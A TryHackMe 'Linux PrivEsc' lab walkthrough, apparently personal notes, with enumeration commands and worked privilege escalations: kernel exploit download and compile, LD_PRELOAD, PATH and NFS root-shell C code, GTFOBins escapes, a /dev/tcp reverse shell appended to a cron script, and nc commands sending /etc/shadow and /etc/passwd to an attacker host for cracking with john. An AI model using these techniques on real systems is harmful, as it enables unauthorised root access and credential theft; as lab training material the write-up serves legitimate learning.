<!-- TOC -->

- [Linux PrivEsc](#linux-privesc)
    - [Enumeration](#enumeration)
    - [Privilege Escalation: Kernel Exploits](#privilege-escalation-kernel-exploits)
    - [Privilege Esvalation: Sudo](#privilege-esvalation-sudo)
    - [Privilege Escalation: SUID](#privilege-escalation-suid)
    - [Privilege Escalation: Capabilities](#privilege-escalation-capabilities)
    - [Privilege Escalation: Cron Jobs](#privilege-escalation-cron-jobs)
    - [Privilege Escalation: PATH](#privilege-escalation-path)
    - [Privilege Escalation: NFS](#privilege-escalation-nfs)
    - [Capstone Challenge](#capstone-challenge)

<!-- /TOC -->

# Linux PrivEsc

[Linux PrivEsc Room](https://tryhackme.com/room/linprivesc)

Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.

## Enumeration

System info:

```bash
hostname -a
cat /proc/version
cat /etc/issue
```

Processes info:

```bash
ps -A
ps axjf
ps aux
```

Configurations:

```bash
env
sudo -l
id
cat /etc/passwd
ifconfig
ip route
netstat -tupan
```

Search: (to filter add: `2>/dev/null` at the end)

```bash
find / -name flag*.txt
find / -type d -name config
find / -type f -perm 0777
find / -perm a=x
find / -user <USER>
find / -writable -type d
find / -perm -u=s -type f
```

| Title | IP Address |
| :---- | :---- |
| LineKernel | `1*.**.***.***` |

```bash
hostname
```

> `w*******`

```bash
uname -a
```

> `3.**.*-**-*******`

```bash
cat /etc/issue
```

> `U***** 1*.** LTS`

```bash
python --version
```

> `*.*.*`

Google: `3.13.0-24-generic`

> `CVE-****-****`

## Privilege Escalation: Kernel Exploits

```bash
searchsploit linux kernel 3.13.0
```

> `linux/local/37292.c`

```bash
searchsploit -m linux/local/37292.c
python3 -m http.server 80   
```

RHOST:

```bash
cd /dev/shm
wget http://1*.*.**.**/37292.c
gcc 37292.c -o 37292
chmod 700 37292
./37292
find / -type f -name flag1.txt
```

> `/****/****/flag1.txt`

```bash
cat /****/****/flag1.txt
```

> `THM-**************`

## Privilege Esvalation: Sudo

```bash
sudo -l
```

If `LD_PRELOAD` is available + application root privilege:

```c
/* shell.c */

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/ldpreload/shell.so <SUDO-APP>
```

| Title | IP Address |
| :---- | :---- |
| LinPrivEscSUDO | `1*.**.**.**` |

```bash
sudo -l
```

> `(ALL) NOPASSWD: /usr/bin/find`

> `(ALL) NOPASSWD: /usr/bin/less`

> `(ALL) NOPASSWD: /usr/bin/nano`

```bash
find / -type f -name flag2.txt
```

> `/****/******/flag2.txt`

```bash
cat /****/******/flag2.txt
```

> `THM-*********`

Using [GTFOBins](https://gtfobins.github.io)

> `sudo nmap --***********`

```bash
sudo less /etc/shadow
```

> `$*$*.*UUD*OLI*XK***$*I***FE************D*DHLHHP*X**I*.*N***/BJ****PRJW***WE**HH.**V***DE*W***C***B*****LR*`

## Privilege Escalation: SUID

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

If you have the /etc/shadow and /etc/passwd:

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

To create a hash value for passwd:

```bash
openssl passwd -1 -salt <THM> <password1>
```

| Title | IP Address |
| :---- | :---- |
| LinPrivEscSUID | `1*.**.***.**` |

```bash
cat /etc/passwd
```

> `g**********:x:1001:1001::/home/g**********:/bin/sh`

Using [GTFOBins](https://gtfobins.github.io/):

```bash
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```

- Copy

```bash
cat /ect/passwd
```

- Copy

LHOST:

```bash
unshadow passwd shadow > passwords
john passwords
```

> `P******** (user2)`

```bash
find -type f -name flag3.txt 2>/dev/null
```

> `./****/******/flag3.txt`

```bash
LFILE=/****/******/flag3.txt
base64 "$LFILE" | base64 --decode
```

> `THM-*******`

## Privilege Escalation: Capabilities

| Title | IP Address |
| :---- | :---- |
| LinPrivEscCAPA | `1*.**.***.**` |

```bash
getcap -r / 2>/dev/null
```

> `/home/ubuntu/**** = cap_setuid+ep`

> `/home/karen/*** = cap_setuid+ep`

Using [GTFOBins](https://gtfobins.github.io)

```bash
./*** -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
find / -type f -name flag4.txt 2>/dev/null
```

> `./****/******/flag4.txt`

```bash
cat /****/******/flag4.txt
```

> `THM-*******`

## Privilege Escalation: Cron Jobs

| Title | IP Address |
| :---- | :---- |
| LinPrivEscCRON | `1*.**.***.***` |

```bash
cat /etc/crontab
```

Append to `backup.sh`:

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/10.6.31.75/8080 <&1'" >> backup.sh
```

```bash
find / -type f -name flag5.txt 2>/dev/null
```

> `/****/******/flag5.txt`

```bash
cat /****/******/flag5.txt
```

> `THM-*********`

```bash
nc -lvnp 80 > shadow
nc -lvnp 81 > passwd
```

RHOST:

```bash
nc -q 1 10.6.31.75 80 < /etc/shadow
nc -q 1 10.6.31.75 81 < /etc/passwd
```

LHOST:

```bash
unshadow passwd shadow > passwords
john passwords
```

> `1***** (matt)`

## Privilege Escalation: PATH

```c
/* path_exp.c */
#include<unistd.h>
void main() { 
    setuid(0);
    setgid(0);
    system("thm");
}
```

```bash
gcc path_exp.c -o path -w
chmod u+s path
export PATH=/tmp:$PATH
echo "/bin/bash" > /tmp/thm
chmod 777 /tmp/thm
```

| Title | IP Address |
| :---- | :---- |
| LinPrivEscPATH3 | `1*.**.***.***` |

```bash
find / -writable 2>/dev/null
```

> `/****/*******`

```bash
cd /****/*******
ls -lah
```

> `-rwsr-xr-x 1 root root 16712 Jun 20  2021 test`

```bash
./test
```

> `sh: 1: thm: not found`

```bash
echo "/bin/bash" > /tmp/thm
chmod 777 /tmp/thm
export PATH=/tmp:$PATH
./test
find / -type f -name flag6.txt 2>/dev/null
```

> `/****/****/flag6.txt`

```bash
cat /****/****/flag6.txt
```

> `THM-*********`

## Privilege Escalation: NFS

```bash
cat /etc/exports
showmount -e <TARGET-IP>
mkdir <LFOLDER>
mount -o rw <TARGET-IP>:/<RFOLDER> <LFOLDER>
```

```c
/* nfs.c */
#include <stdio.h>
#include <stdlib.h>

int main()
{ 
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

```bash
gcc nfs.c -o nfs -w
chmod +s nfs
```

| Title | IP Address |
| :---- | :---- |
| LinPrivEscNFS | `1*.**.***.**` |

LHOST:

```bash
showmount -e 1*.**.***.**
mkdir /tmp/sharedfolder
sudo mount -o rw 1*.**.***.**:/home/ubuntu/sharedfolder  /tmp/sharedfolder
```

Copy the above payload to `/tmp/sharedfolder/payload.c`

```bash
cd /tmp/sharedfolder
sudo gcc payload.c -o payload -w
sudo chmod +s payload
```

RHOST:

```bash
cd /home/ubuntu/sharedfolder
./payload
find / -type f -name flag7.txt
```

> `/****/****/flag7.txt`

```bash
cat /****/****/flag7.txt
```

> `THM-********`

## Capstone Challenge

| Title | IP Address | Username | Password |
| :---- | :---- | :---- | :---- |
| Linux Privesc Challenge | `1*.**.*.***` | leonard | Penny123 |

LHOST:

```bash
nc -q 1 -lvnp 80 < linpeas.sh
nc -lvnp 81 | tee lp.out
```

RHOST:

```bash
nc 10.6.31.75.80 | bash -s -a | nc 10.6.31.75 81
```

- Writable path:

> `/home/leonard`/scripts:/usr/sue/bin:/usr/lib64/qt-3.3/bin:`/home/leonard/perl5`/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:`/home/leonard/.local`/bin:`/home/leonard`/bin

- SUID:

> `-rwsr-xr-x. 1 root root 37K Aug 20  2019 /usr/bin/base64`

LHOST:

```bash
nc -q 1 -lvnp 80 | tee shadow
nc -q 1 -lvnp 81 | tee passwd
```

Using [GTFOBins](https://gtfobins.github.io)

RHOST:

```bash
base64 "/etc/shadow" | base64 -d | nc 1*.*.**.** 80
cat /etc/passwd | nc 1*.*.**.** 81
```

LHOST:

```bash
unshadow passwd shadow > passwords
john passwords
```

> `P******** (missy)`

RHOST using `missy:P********`:

```bash
su missy
sudo -l
```

> `(ALL) NOSPASSWD: /usr/bin/find`

```bash
sudo find / -type f -name flag*.txt
```

> `/****/*****/D********/flag1.txt`

> `/****/********/flag2.txt`

```bash
cat /****/*****/D********/flag1.txt
```

> `THM-**************`

Using [GTFOBins](https://gtfobins.github.io)

```bash
find . -exec /bin/sh \; -quit
cat /****/********/flag2.txt
```

> `THM-***************`
